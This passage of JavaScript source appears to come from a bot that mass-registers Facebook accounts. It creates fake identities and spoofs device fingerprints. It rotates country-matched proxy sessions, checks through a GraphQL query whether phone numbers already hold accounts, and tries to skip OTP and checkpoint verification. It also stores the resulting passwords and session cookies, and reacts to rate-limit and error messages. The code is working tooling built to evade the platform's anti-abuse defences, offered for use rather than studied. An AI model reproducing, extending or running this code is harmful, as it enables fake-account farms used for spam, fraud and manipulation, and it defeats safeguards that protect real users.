      logs.push(`Resend ${round}/${totalRounds}: auto-confirmed UID=${stepRes.uid}`);
      if (opts.onStep) await opts.onStep(round, totalRounds, stepRes, curItem);
      return {
        count,
        alreadyConfirmed: true,
        uid: stepRes.uid,
        cookies: stepRes.cookies,
        item: curItem,
        logs,
      };
    }

    if (stepRes.ok) {
      count += 1;
      logs.push(`Resend ${round}/${totalRounds} OK via ${stepRes.via}`);
      if (opts.onStep) await opts.onStep(round, totalRounds, stepRes, curItem);
    } else {
      logs.push(`Resend ${round}/${totalRounds} stopped: ${stepRes.reason || 'failed'}`);
      if (opts.onStep) await opts.onStep(round, totalRounds, stepRes, curItem);
      if (stepRes.rateLimited || /no resend link\/form/i.test(stepRes.reason || '')) break;
    }
  }

  return { count, alreadyConfirmed: false, item: curItem, logs };
}

async function checkAccountLogin(item, cfg, baseCookieOverride) {
  const baseJar = parseCookieHeader(baseCookieOverride || '');
  const jar = { ...baseJar, ...(item.cookies || {}) };
  const px = (item.proxy || cfg.proxy || '').trim() || null;
  if (jar.c_user && jar.xs) {
    return { ok: true, uid: jar.c_user, cookies: orderCookies(jar) };
  }
  const pw = (item.pass || cfg.password || '').trim();
  const uid = await loginUid(item.phone, pw, cfg, jar, px);
  if (uid && jar.xs) {
    return { ok: true, uid, cookies: orderCookies(jar) };
  }
  if (uid) {
    return { ok: false, reason: 'Account UID found but requires confirmation/checkpoint before session cookie is issued.' };
  }
  // Check GraphQL to determine whether an account actually exists on Facebook at all
  try {
    const gql = await checkNumberGraphql(`+${item.phone}`, {
      cc: cfg.cc,
      proxy: px,
      strictProxy: cfg.strict_proxy !== false,
      timeoutMs: 18000,
    });
    if (gql.status === 'free') {
      return {
        ok: false,
        notCreated: true,
        reason: 'No Facebook account exists for this number (failed signup session).',
      };
    }
    if (gql.status === 'taken') {
      return {
        ok: false,
        existsOnFb: true,
        reason: 'Account exists on Facebook but login needs OTP / checkpoint confirmation.',
      };
    }
  } catch {
    // ignore gql fallback error
  }
  if (/\/reg\/submit\//i.test(item.confirm_url || '') && !item.action) {
    return {
      ok: false,
      notCreated: true,
      reason: 'Incomplete signup session (no confirmation form or account UID created).',
    };
  }
  return { ok: false, reason: 'Account still requires OTP / checkpoint confirmation.' };
}

async function runLimitedSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px, trace, opts }) {
  const timeoutMs = (cfg.timeout || 18) * 1000;
  const strictProxy = cfg.strict_proxy !== false;
  const proxySaver = cfg.proxy_saver !== false;

  // Step 1: Optional www.facebook.com homepage warmup (skipped in Proxy Saver mode to save ~500-900KB per ID)
  if (!proxySaver) {
    try {
      await fetchWithJar('https://www.facebook.com/', jar, {
        timeoutMs: Math.min(timeoutMs, 8000),
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, 'sec-fetch-site': 'none' },
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError) throw err;
    }

    if (!(await sleepAbort(100 + Math.floor(Math.random() * 150), opts.shouldAbort))) {
      return { aborted: true };
    }
  } else if (px) {
    proxyTrafficStats.savedWarmups += 1;
    trace.push('px-saver');
  }

  // Step 2: GET limited.facebook.com registration entrypoint
  const regUrl = `${FB_REG_BASE}/reg/?cid=103&refsrc=deprecated&soft=hjk`;
  const rGet = await fetchWithJar(regUrl, jar, {
    timeoutMs: Math.min(timeoutMs, 14000),
    proxy: px,
    strictProxy,
    ua: fp.ua,
    headers: { ...fp.headers, Referer: 'https://www.facebook.com/', 'sec-fetch-site': 'same-site' },
    shouldAbort: opts.shouldAbort,
  });
  const regHtml = rGet.text || '';
  const mLsd =
    regHtml.match(/"LSD",\[\],\{"token":"([^"]+)"/) ||
    regHtml.match(/name=["']lsd["'][^>]*value=["']([^"']+)["']/i) ||
    regHtml.match(/value=["']([^"']+)["'][^>]*name=["']lsd["']/i);
  const lsd = mLsd ? mLsd[1] : DEFAULT_FB_LSD;
  const jaz = tok(regHtml, 'jazoest') || jazoest(lsd);
  trace.push(`lim-get ${rGet.status}/${regHtml.length}B lsd=${lsd.slice(0, 6)} fp=${fp.model}`);

  if (rGet.status >= 400) {
    return { retryNext: true, err: `limited GET HTTP ${rGet.status}` };
  }

  // Step 3: Fast realistic submit pacing (250-500ms)
  if (!(await sleepAbort(250 + Math.floor(Math.random() * 250), opts.shouldAbort))) {
    return { aborted: true };
  }

  // Step 4: Submit payload to limited.facebook.com/reg/submit/
  const regForm = readForm(regHtml, 'reg');
  const regInst = regForm.inputs?.reg_instance?.[1] || crypto.randomUUID().replace(/-/g, '').slice(0, 24);
  const payload = new URLSearchParams({
    ccp: regForm.inputs?.ccp?.[1] || '2',
    reg_instance: regInst,
    submission_request: 'true',
    helper: '',
    reg_impression_id: regForm.inputs?.reg_impression_id?.[1] || crypto.randomUUID(),
    ns: regForm.inputs?.ns?.[1] || '1',
    zero_header_af_client: '',
    app_id: '103',
    logger_id: regForm.inputs?.logger_id?.[1] || crypto.randomUUID(),
    'field_names[0]': 'firstname',
    firstname: identity.first,
    lastname: identity.last,
    'field_names[1]': 'birthday_wrapper',
    birthday_day: String(identity.bd),
    birthday_month: String(identity.bm),
    birthday_year: String(identity.by),
    age_step_input: '',
    did_use_age: 'false',
    'field_names[2]': 'reg_email__',
    reg_email__: cleanPhone,
    'field_names[3]': 'sex',
    sex: identity.sex,
    preferred_pronoun: '',
    custom_gender: '',
    'field_names[4]': 'reg_passwd__',
    reg_passwd__: pw,
    was_shown_name_suggestions: 'false',
    did_use_suggested_name: 'false',
    use_custom_gender: 'false',
    guid: '',
    pre_form_step: '',
    submit: 'Sign up',
    lsd,
    jazoest: jaz,
    __req: '7',
    __fmt: '1',
    __user: '0',
  }).toString();

  const postHeaders = {
    ...fp.xhrHeaders,
    'Content-Type': 'application/x-www-form-urlencoded',
    'x-response-format': 'JSONStream',
    'x-asbd-id': '359341',
    'x-requested-with': 'XMLHttpRequest',
    origin: FB_REG_BASE,
    referer: regUrl,
    'x-fb-lsd': lsd,
  };

  const submitUrl = `${FB_REG_BASE}/reg/submit/?app_id=103&multi_step_form=1&skip_suma=0&shouldForceMTouch=1`;
  const rPost = await fetchWithJar(submitUrl, jar, {
    method: 'POST',
    body: payload,
    timeoutMs: timeoutMs + 3000,
    proxy: px,
    strictProxy,
    ua: fp.ua,
    headers: postHeaders,
    shouldAbort: opts.shouldAbort,
  });

  const body = rPost.text || '';
  const urlLow = (rPost.url || '').toLowerCase();
  trace.push(`lim-post ${rPost.status}/${body.length}B`);

  // Extract c_user from cookie jar or response body (matches bot.py)
  let uid = jar.c_user || '';
  if (!uid) {
    const mUid = body.match(/"c_user"\s*:\s*"?(\d{6,})"?/) || body.match(/"USER_ID"\s*:\s*"(\d{6,})"/);
    if (mUid && mUid[1] !== '0') {
      uid = mUid[1];
      jar.c_user = uid;
    }
  }

  // Parse BigPipe HTML + JSONStream chunks accurately
  const postSignals = extractFbResponseSignals(body);
  const interestingUri = postSignals.redirectUris.find(
    (u) => /\/(?:confirm(?:phone|email|_code)|checkpoint|recover|home\.php|welcome)/i.test(u) && !u.includes('/r.php')
  );

  // Follow explicit navigation redirect inside same sticky proxy & cookie jar if no uid yet
  let followRes = null;
  if (!uid && interestingUri) {
    try {
      const target = new URL(interestingUri, FB_REG_BASE).toString();
      followRes = await fetchWithJar(target, jar, {
        timeoutMs,
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, Referer: regUrl },
        shouldAbort: opts.shouldAbort,
      });
      if (jar.c_user) uid = jar.c_user;
      if (!uid) {
        const u2 = extractUidFromHtml(followRes.text, followRes.url);
        if (u2) {
          uid = u2;
          jar.c_user = u2;
        }
      }
      trace.push(`follow -> ${followRes.status} (${(followRes.url || '').split('?')[0].slice(-28)})`);
    } catch (err) {
      if (err && err.isProxyError) throw err;
    }
  }

  const ordered = orderCookies(jar);
  if (uid && !urlLow.includes('/checkpoint')) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: ordered,
        err: '',
        fmt,
        engine: 'limited',
      },
    };
  }

  const evalBody = followRes ? followRes.text || body : body;
  const evalUrl = followRes ? followRes.url || rPost.url || '' : rPost.url || '';
  const evalUrlLow = evalUrl.toLowerCase();
  const evalSignals = followRes ? extractFbResponseSignals(evalBody) : postSignals;
  const visibleLow = evalSignals.visibleText.toLowerCase();
  const errTexts = evalSignals.errTexts;
  const errBlobLow = errTexts.join(' | ').toLowerCase();
  const errCombinedLow = `${errBlobLow}\n${visibleLow}`;

  // Check skippable dialog / anti-checkpoint skip probe
  if (cfg.skip_probe && (visibleLow.includes('skip') || visibleLow.includes('confirm'))) {
    const skippedOk = await trySkip(jar, evalSignals.decodedHtml, FB_REG_BASE, timeoutMs, px, fp);
    if (skippedOk && jar.c_user) {
      return {
        result: {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: jar.c_user,
          status: 'OK',
          confirmed: true,
          printer: fp.pringer,
          cookies: orderCookies(jar),
          err: '',
          fmt,
          engine: 'limited+skip',
        },
      };
    }
  }

  // If FB created account with UID and valid xs session cookie
  if (uid && ordered.xs) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: ordered,
        err: '',
        fmt,
        engine: 'limited',
      },
    };
  }

  // Real registration errors FIRST (prevent false CONFIRM on error responses!)
  if (
    errCombinedLow.includes('already') &&
    (errCombinedLow.includes('account') || errCombinedLow.includes('registered') || errCombinedLow.includes('used'))
  ) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: '',
        status: 'USED',
        confirmed: false,
        printer: fp.pringer,
        cookies: ordered,
        err: errTexts[0]?.slice(0, 120) || 'Number already has an account',
        fmt,
        engine: 'limited',
      },
    };
  }
  if (
    errCombinedLow.includes('too many') ||
    errCombinedLow.includes('rate limit') ||
    errCombinedLow.includes('try again later') ||
    errCombinedLow.includes('temporarily blocked')
  ) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: '',
        status: 'LIMIT',
        confirmed: false,
        printer: fp.pringer,
        cookies: ordered,
        err: errTexts[0]?.slice(0, 120) || 'Rate limited by Facebook',
        fmt,
        engine: 'limited',
      },
    };
  }
  if (
    ['valid phone', 'valid number', 'valid mobile', 'invalid number', "isn't valid", 'different number', 'please enter a valid'].some((w) =>
      errCombinedLow.includes(w)
    )
  ) {
    return { retryNext: true, err: errTexts[0]?.slice(0, 100) || `invalid format (${fmt})`, html: evalBody };
  }

  // Strict CONFIRM / CHECKPOINT verification (NO false positives from raw JS/BigPipe bootloader strings!)
  const parsedOtp = readForm(evalSignals.decodedHtml, 'otp');
  const otpActionLow = (parsedOtp.action || '').toLowerCase();
  const hasRealOtpForm =
    Boolean(parsedOtp.action) &&
    !otpActionLow.includes('/reg/submit') &&
    (OTP_FIELDS.some((k) => k in parsedOtp.inputs) || /confirm(?:phone|email|_code)|checkpoint/i.test(otpActionLow));

  const confirmUrlDetected =
    interestingUri && interestingUri.startsWith('http')
      ? interestingUri
      : interestingUri
      ? new URL(interestingUri, FB_REG_BASE).toString()
      : evalUrl;

  const navigatedToCheckpoint =
    evalUrlLow.includes('/checkpoint') ||
    urlLow.includes('/checkpoint') ||
    evalSignals.redirectUris.some((u) => /\/checkpoint/i.test(u));

  const navigatedToConfirm =
    /\/confirm(?:phone|email|_code)/i.test(evalUrlLow) ||
    evalSignals.redirectUris.some((u) => /\/confirm(?:phone|email|_code)/i.test(u));

  const visibleConfirmHint =
    CONFIRM_WORDS.some((w) => visibleLow.includes(w) || errBlobLow.includes(w)) &&
    (hasRealOtpForm || navigatedToConfirm || Boolean(uid));

  const isCheckpoint =
    navigatedToCheckpoint ||
    ((visibleLow.includes('we suspended your account') || visibleLow.includes('confirm you') && visibleLow.includes('human')) &&
      (hasRealOtpForm || navigatedToCheckpoint || Boolean(uid)));

  const isConfirm = !isCheckpoint && (hasRealOtpForm || (navigatedToConfirm && visibleConfirmHint));

  if ((isConfirm || isCheckpoint) && (hasRealOtpForm || navigatedToConfirm || navigatedToCheckpoint || Boolean(uid))) {
    const stName = isCheckpoint ? 'CHECKPOINT' : 'CONFIRM';
    const pendingPayload = {
      status: stName,
      phone,
      name: identity.name,
      pass: pw,
      uid: uid || '',
      cookies: orderCookies(jar),
      action: hasRealOtpForm ? parsedOtp.action : '',
      fields: hasRealOtpForm ? Object.fromEntries(Object.entries(parsedOtp.inputs).map(([k, v]) => [k, v[1]])) : {},
      confirm_url: confirmUrlDetected,
      proxy: px || '',
      ua: fp.ua,
      pringer: fp.pringer,
      fmt,
      confirmed: false,
      createdAt: Date.now(),
      resendCount: 0,
      _lastConfirmHtml: evalBody,
    };
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: uid || '',
        status: stName,
        confirmed: false,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: errTexts[0] ? errTexts[0].slice(0, 120) : '',
        fmt,
        engine: 'limited',
        pendingPayload,
      },
    };
  }

  if (evalUrlLow.includes('login/identify')) {
    return { retryNext: true, err: 'Redirected to recover (IP/fingerprint trust)', html: evalBody };
  }
  if (Object.keys(ordered).length === 0) {
    return { retryNext: true, err: 'No cookies returned', html: evalBody };
  }

  // Last-ditch UID check via loginUid on same jar & sticky proxy
  const loggedUid = await loginUid(cleanPhone, pw, cfg, jar, px, fp);
  if (loggedUid && jar.xs) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: loggedUid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'limited+login',
      },
    };
  }

  const fbRejectedHint =
    errTexts[0] ||
    (visibleLow.includes('couldn') && visibleLow.includes('create') ? "Facebook couldn't create account on this attempt" : '') ||
    (evalUrlLow.includes('/reg/submit') ? 'Rejected on /reg/submit (no UID or confirm page)' : '') ||
    `HTTP ${rPost.status} (${trace.slice(-1)[0] || 'no uid'})`;
  return { retryNext: true, err: fbRejectedHint.slice(0, 140), html: evalBody };
}

async function runClassicSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px, trace, opts }) {
  const timeoutMs = (cfg.timeout || 18) * 1000;
  const strictProxy = cfg.strict_proxy !== false;
  const tk = await harvestTokens(cfg, jar, trace, px, { shouldAbort: opts.shouldAbort, fp });
  if (!tk) {
    return { retryNext: true, err: `no token (${trace.slice(-2).join(', ') || 'blocked'})` };
  }

  const data = {};
  for (const [k, [typ, val]] of Object.entries(tk.inputs)) {
    if (typ === 'hidden' || k.toLowerCase() === 'lsd' || k.toLowerCase() === 'jazoest') {
      data[k] = val;
    }
  }
  for (const [sname, selectOpts] of Object.entries(tk.selects)) {
    const low = sname.toLowerCase();
    let want = '';
    if (low.includes('month')) want = String(identity.bm);
    else if (low.includes('day')) want = String(identity.bd);
    else if (low.includes('year')) want = String(identity.by);
    else if (low.includes('country')) want = cfg.cc;
    else if (low.includes('sex') || low.includes('gender')) want = identity.sex;
    if (!want) continue;
    const match = selectOpts.find(([v, t]) => v === want || t.trim().startsWith(want));
    if (match) data[sname] = match[0];
  }

  Object.assign(data, {
    firstname: identity.first,
    lastname: identity.last,
    reg_email__: cleanPhone,
    reg_email_confirmation__: cleanPhone,
    reg_passwd__: pw,
    sex: identity.sex,
    birthday_month: String(identity.bm),
    birthday_day: String(identity.bd),
    birthday_year: String(identity.by),
    submit: 'Sign Up',
    lsd: tk.lsd,
    jazoest: jazoest(tk.lsd),
  });
  if (tk.etok) data.e_token = tk.etok;
  if (tk.dhash) data.d_hash = tk.dhash;
  if (tk.cid) data.cid = tk.cid;
  if (tk.regInstance) data.reg_instance = tk.regInstance;
  for (const k of Object.keys(data)) {
    if (k.toLowerCase().includes('country')) data[k] = cfg.cc;
  }
  delete data.password;

  const xrPath = `/mreg${tk.qs}`;
  jar['x-referer'] = encodeURIComponent(JSON.stringify({ r: xrPath, h: xrPath, s: 'm' }));

  let bestRes = null;
  let lastErr = '';
  for (const act of tk.actions) {
    if (opts.shouldAbort && opts.shouldAbort()) return { aborted: true };
    try {
      await sleepAbort(120 + Math.floor(Math.random() * 150), opts.shouldAbort);
      const r = await fetchWithJar(act, jar, {
        method: 'POST',
        body: new URLSearchParams(data).toString(),
        timeoutMs: timeoutMs + 3000,
        proxy: px,
        strictProxy,
        shouldAbort: opts.shouldAbort,
        ua: tk.ua,
        headers: {
          Referer: `${tk.base}/reg/${tk.qs}`,
          Origin: tk.base,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      trace.push(`post ${act.split('facebook.com').pop()?.slice(0, 18)} -> ${r.status}/${(r.text || '').length}B`);
      if (r.status < 400 && (r.text || '').length > 800) {
        bestRes = r;
        const visibleLow = extractVisibleText(r.text || '').toLowerCase();
        if (jar.c_user || CONFIRM_WORDS.some((w) => visibleLow.includes(w)) || ERR_WORDS.some(([p]) => visibleLow.includes(p))) {
          break;
        }
      }
      if (!bestRes) bestRes = r;
    } catch (err) {
      if (err && err.isProxyError) throw err;
      lastErr = err instanceof Error ? err.message : 'post failed';
    }
  }

  if (!bestRes) {
    return { retryNext: true, err: lastErr || 'classic post failed' };
  }

  const body = bestRes.text || '';
  const signals = extractFbResponseSignals(body);
  const visibleLow = signals.visibleText.toLowerCase();
  const rawLow = body.toLowerCase();
  const resUrlLow = (bestRes.url || '').toLowerCase();

  if (jar.c_user && !resUrlLow.includes('/checkpoint')) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: jar.c_user,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic',
      },
    };
  }

  const parsedOtp = readForm(signals.decodedHtml, 'otp');
  const otpActionLow = (parsedOtp.action || '').toLowerCase();
  const hasRealOtpForm =
    Boolean(parsedOtp.action) &&
    !otpActionLow.includes('/reg/submit') &&
    (OTP_FIELDS.some((k) => k in parsedOtp.inputs) || /confirm(?:phone|email|_code)|checkpoint/i.test(otpActionLow));
  const navigatedToConfirm = /\/confirm(?:phone|email|_code)/i.test(resUrlLow);
  const isConfirm =
    hasRealOtpForm ||
    (navigatedToConfirm && CONFIRM_WORDS.some((w) => visibleLow.includes(w)));

  if (isConfirm && cfg.skip_probe) {
    const skippedOk = await trySkip(jar, signals.decodedHtml, tk.base, timeoutMs, px, fp);
    if (skippedOk && jar.c_user) {
      return {
        result: {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: jar.c_user,
          status: 'OK',
          confirmed: true,
          printer: fp.pringer,
          cookies: orderCookies(jar),
          err: '',
          fmt,
          engine: 'classic+skip',
        },
      };
    }
  }

  if (isConfirm) {
    const pendingPayload = {
      status: 'CONFIRM',
      phone,
      name: identity.name,
      pass: pw,
      uid: jar.c_user || '',
      cookies: orderCookies(jar),
      action: hasRealOtpForm ? parsedOtp.action : '',
      fields: hasRealOtpForm ? Object.fromEntries(Object.entries(parsedOtp.inputs).map(([k, v]) => [k, v[1]])) : {},
      confirm_url: bestRes.url,
      proxy: px || '',
      ua: fp.ua,
      pringer: fp.pringer,
      fmt,
      confirmed: false,
      createdAt: Date.now(),
      resendCount: 0,
      _lastConfirmHtml: body,
    };
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: jar.c_user || '',
        status: 'CONFIRM',
        confirmed: false,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic',
        pendingPayload,
      },
    };
  }

  for (const [phrase, st] of ERR_WORDS) {
    if (visibleLow.includes(phrase)) {
      if (st === 'BADNUM') {
        return { retryNext: true, err: `invalid format (${fmt})`, html: body };
      }
      return {
        result: {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: '',
          status: st,
          confirmed: false,
          printer: fp.pringer,
          cookies: orderCookies(jar),
          err: phrase,
          fmt,
          engine: 'classic',
        },
      };
    }
  }

  const loggedUid = await loginUid(cleanPhone, pw, cfg, jar, px, fp);
  if (loggedUid && jar.xs) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: loggedUid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic+login',
      },
    };
  }

  if (resUrlLow.includes('/checkpoint') || (hasRealOtpForm && otpActionLow.includes('checkpoint'))) {
    const cpForm = parsedOtp;
    const pendingPayload = {
      status: 'CHECKPOINT',
      phone,
      name: identity.name,
      pass: pw,
      uid: jar.c_user || '',
      cookies: orderCookies(jar),
      action: cpForm.action,
      fields: Object.fromEntries(Object.entries(cpForm.inputs).map(([k, v]) => [k, v[1]])),
      confirm_url: bestRes.url,
      proxy: px || '',
      ua: fp.ua,
      pringer: fp.pringer,
      fmt,
      confirmed: false,
      createdAt: Date.now(),
      resendCount: 0,
      _lastConfirmHtml: body,
    };
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: jar.c_user || '',
        status: 'CHECKPOINT',
        confirmed: false,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic',
        pendingPayload,
      },
    };
  }

  if (body.includes('reg_email__')) {
    const errs = signals.errTexts.join(' | ').slice(0, 140);
    return { retryNext: true, err: `re-render: ${errs || 'no msg'}`, html: body };
  }

  if (!tk.hasClassicForm && (tk.isCometSpa || rawLow.includes('caaregistration'))) {
    return { retryNext: true, err: `Comet SPA (${bestRes.status})`, html: body };
  }

  return { retryNext: true, err: signals.errTexts[0]?.slice(0, 120) || `HTTP ${bestRes.status} (${trace.slice(-1)[0] || 'no confirm form'})`, html: body };
}

async function runNodeAttempt(phone, pw, cfg, proxy, opts = {}) {
  const numDet = detectCountryFromNumber(`+${phone}`, cfg.cc, opts.countryHint || '') || {
    normalized: phone,
    cc: cfg.cc,
    name: opts.countryHint || getCountryInfo(cfg.cc)[0],
    iso: countryNameToIso(opts.countryHint) || getCountryInfo(cfg.cc)[1],
  };
  const autoCountry = cfg.auto_proxy_country !== false;
  const autoRefresh = cfg.auto_proxy_refresh !== false;
  const effectiveCc = autoCountry && numDet.cc ? numDet.cc : cfg.cc;
  const [fbName, fbIso] = getCountryInfo(effectiveCc);
  const effectiveName = numDet.name && numDet.name !== 'Unknown' ? numDet.name : (opts.countryHint || fbName);
  const effectiveIso = autoCountry && numDet.iso && numDet.iso !== '??' ? numDet.iso : (countryNameToIso(opts.countryHint) || fbIso);

  const identity = generateIdentity(effectiveCc);
  const fmts = numberVariants(phone, effectiveCc);
  const pool = [...(opts.proxiesPool || [])];
  if (cfg.proxy_mode === 'random') {
    for (let k = pool.length - 1; k > 0; k--) {
      const j = Math.floor(Math.random() * (k + 1));
      [pool[k], pool[j]] = [pool[j], pool[k]];
    }
  }
  const tries = Math.max(2, Math.min(12, Number(cfg.retries || 4)));
  const badProxies = opts.badProxies || new Set();
  const engineMode = cfg.engine_mode || 'hybrid';
  let lastErr = 'unknown';
  let lastFmt = fmts[0] || phone;
  let lastHtml = '';
  let lastPringer = '';

  const log = (m) => {
    if (opts.onDebug) opts.onDebug(m);
    else appendDebugLog(m);
  };

  // Optional GraphQL pre-check before wasting registration attempts (defaults to 0-proxy Direct GQL)
  if (cfg.precheck_gql !== false && !opts.skipPrecheck) {
    const useDirectGql = cfg.gql_via_direct !== false;
    const rawPrePx = useDirectGql
      ? null
      : pool.length > 0
      ? selectSmartProxy(pool, 0, badProxies, cfg.proxy_mode || 'rotate', proxy || cfg.proxy || null)
      : proxy || cfg.proxy || null;
    const preAdapted = adaptProxyForSession(rawPrePx, {
      iso: effectiveIso,
      autoCountry,
      refreshSession: autoRefresh,
    });
    let prePx = useDirectGql ? null : preAdapted.url;
    let preIsoUsed = useDirectGql ? 'DIRECT' : (preAdapted.isoApplied || effectiveIso || 'PX');
    const runPrecheck = async (proxyTarget) =>
      checkNumberGraphql(`+${phone}`, {
        cc: effectiveCc,
        proxy: proxyTarget,
        strictProxy: cfg.strict_proxy !== false,
        timeoutMs: Math.min((cfg.timeout || 18) * 1000, 10000),
        shouldAbort: opts.shouldAbort,
      });

    try {
      let gql;
      try {
        gql = await runPrecheck(prePx);
      } catch (err) {
        if (err && err.isProxyError && /407/.test(err.message || '') && rawPrePx && (preAdapted.countryInjected || preAdapted.sessionInjected)) {
          dynamicProxyTagBlacklist.add(proxyHealthKey(rawPrePx));
          prePx = rawPrePx;
          preIsoUsed = effectiveIso || 'STATIC';
          gql = await runPrecheck(rawPrePx);
        } else {
          throw err;
        }
      }
      const pxTag = prePx
        ? ` [${effectiveName} • ${preIsoUsed}${preAdapted.sessionId ? `:${preAdapted.sessionId.slice(0, 6)}` : ''}]`
        : ` [${effectiveName} • ${effectiveIso} • DirectGQL]`;
      log(`+${phone}${pxTag} GQL pre-check -> ${gql.status}${gql.nameHint ? ` (${gql.nameHint})` : ''}${gql.reason ? ` [${gql.reason}]` : ''}`);
      if (gql.status === 'taken') {
        return {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: '',
          status: 'USED',
          confirmed: false,
          printer: '',
          cookies: {},
          err: `Taken (GQL${gql.nameHint ? ': ' + gql.nameHint : ''})`,
          fmt: lastFmt,
          engine: 'graphql-precheck',
          countryName: effectiveName,
          countryIso: effectiveIso,
          countryCc: effectiveCc,
          proxyIso: preIsoUsed,
          proxySession: preAdapted.sessionId || '',
        };
      }
    } catch (err) {
      if (err && err.isProxyError && rawPrePx) badProxies.add(proxyHealthKey(rawPrePx));
      log(`+${phone} [${effectiveIso}] GQL pre-check err: ${err instanceof Error ? err.message : 'failed'}`);
    }
  }

  for (let i = 0; i < tries; i++) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const fmt = fmts[Math.min(Math.floor(i / 2), fmts.length - 1)];
    lastFmt = fmt;
    const cleanPhone = fmt.replace(/\D/g, '');
    const fp = buildFingerprint(effectiveCc);
    lastPringer = fp.pringer;

    const useLimited = engineMode === 'limited' || (engineMode === 'hybrid' && i % 2 === 0);
    // Limited engine matches bot.py: start with empty cookie jar so FB issues authentic datr/sb on warmup GET
    const jar = useLimited ? {} : parseCookieHeader(opts.baseCookiesRaw || normalizeBaseCookiesRaw(''));
    if (!useLimited) {
      jar.wd = `${fp.sw}x${fp.sh}`;
      jar.m_pixel_ratio = String(fp.dpr);
      if (cfg.fresh_id) {
        jar.sb = freshSb();
        jar.datr = randTok(12);
      }
    }

    const rawPx =
      pool.length > 0
        ? selectSmartProxy(pool, i, badProxies, cfg.proxy_mode || 'rotate', proxy || cfg.proxy || null)
        : proxy || cfg.proxy || null;
    // Nanosecond country switch + automatic per-attempt fresh sticky session IP
    const adaptedPx = adaptProxyForSession(rawPx, {
      iso: effectiveIso,
      autoCountry,
      refreshSession: autoRefresh,
    });
    let px = adaptedPx.url;
    let appliedIso = adaptedPx.isoApplied || effectiveIso;
    let appliedSession = adaptedPx.sessionId || '';
    const trace = [];
    if (px) {
      trace.push(`px=${appliedIso}${appliedSession ? ':' + appliedSession.slice(0, 6) : ''}`);
    }

    const execStep = async (proxyTarget) =>
      useLimited
        ? runLimitedSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px: proxyTarget, trace, opts })
        : runClassicSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px: proxyTarget, trace, opts });

    try {
      let stepRes;
      try {
        stepRes = await execStep(px);
      } catch (err) {
        if (err && err.isProxyError && /407/.test(err.message || '') && rawPx && (adaptedPx.countryInjected || adaptedPx.sessionInjected)) {
          dynamicProxyTagBlacklist.add(proxyHealthKey(rawPx));
          px = rawPx;
          appliedIso = effectiveIso;
          appliedSession = '';
          trace.push('407-static-fallback');
          log(`+${phone} [${effectiveIso}] Proxy rejected auto-tag (407); retrying original proxy credentials`);
          stepRes = await execStep(rawPx);
        } else {
          throw err;
        }
      }

      if (stepRes.aborted) break;
      if (stepRes.result) {
        stepRes.result.countryName = effectiveName;
        stepRes.result.countryIso = effectiveIso;
        stepRes.result.countryCc = effectiveCc;
        stepRes.result.proxyIso = appliedIso;
        stepRes.result.proxySession = appliedSession;
        if (stepRes.result.pendingPayload) {
          stepRes.result.pendingPayload.iso = effectiveIso;
          stepRes.result.pendingPayload.country = effectiveName;
          stepRes.result.pendingPayload.cc = effectiveCc;
          stepRes.result.pendingPayload.proxyIso = appliedIso;
          stepRes.result.pendingPayload.proxySession = appliedSession;
          if (!stepRes.result.pendingPayload.proxy && px) stepRes.result.pendingPayload.proxy = px;
        }
        log(`+${phone} [${effectiveName} • ${effectiveIso}] ${stepRes.result.status}${stepRes.result.uid ? ` UID=${stepRes.result.uid}` : ''} [${stepRes.result.engine}] ${trace.join(' | ')}`);
        return stepRes.result;
      }
      if (stepRes.html) lastHtml = stepRes.html.slice(0, 6000);
      lastErr = stepRes.err || 'no result';
      log(`+${phone} [${effectiveName} • ${effectiveIso}] try ${i + 1}/${tries} (${useLimited ? 'limited' : 'classic'}) [${appliedIso}${appliedSession ? `:${appliedSession.slice(0, 6)}` : ''}]: ${lastErr}`);
    } catch (err) {
